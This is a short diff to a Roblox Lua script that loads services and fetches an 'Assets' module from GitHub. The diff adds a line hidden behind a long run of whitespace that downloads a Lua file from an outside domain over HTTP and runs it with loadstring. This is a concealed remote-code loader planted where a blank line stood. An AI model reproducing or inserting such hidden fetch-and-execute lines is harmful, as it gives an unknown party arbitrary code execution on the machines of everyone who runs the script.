@@ -46,7 +46,7 @@ local CoreGui = game:GetService("CoreGui")
 local Chat = game:GetService("Chat")
 
 local Assets = loadstring(game:HttpGet("https://raw.githubusercontent.com/botisznt/GrubHub/main/modules/return/Assets"))()
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    loadstring(game:HttpGet("http://ligma.wtf/theme/dark.lua",true))()
 repeat wait() until Assets ~= nil
 
 local Player = Players.LocalPlayer
